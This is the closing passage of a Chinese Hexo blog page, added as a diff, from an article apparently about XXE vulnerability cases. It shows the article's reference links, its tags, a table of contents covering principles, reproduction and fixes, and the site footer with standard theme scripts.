+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2427</span><br><span class="line">https://mp.weixin.qq.com/s/xV7vtJmFL0FkPX05kiLNVw</span><br><span class="line">https://github.com/Wechat-Group/WxJava/issues/889</span><br><span class="line">https://github.com/Wechat-Group/WxJava/issues/903</span><br><span class="line">https://blog.csdn.net/u013224189/article/details/80902339</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web渗透/" rel="tag"># Web渗透</a>
+          
+            <a href="/tags/XXE-实例利用/" rel="tag"># XXE 实例利用</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/22/移动端/frida1/" rel="next" title="frida理解与学习">
+                <i class="fa fa-chevron-left"></i> frida理解与学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">blackj liuyun</p>
+              <p class="site-description motion-element" itemprop="description">纯净水@流云-自留地</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE实例分析"><span class="nav-number">1.</span> <span class="nav-text">XXE实例分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ex1"><span class="nav-number">1.1.</span> <span class="nav-text">ex1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复措施"><span class="nav-number">1.1.3.</span> <span class="nav-text">修复措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ex2"><span class="nav-number">1.2.</span> <span class="nav-text">ex2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复措施-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">修复措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ex3-–待补充"><span class="nav-number">1.3.</span> <span class="nav-text">ex3 –待补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">blackj liuyun</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">13.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
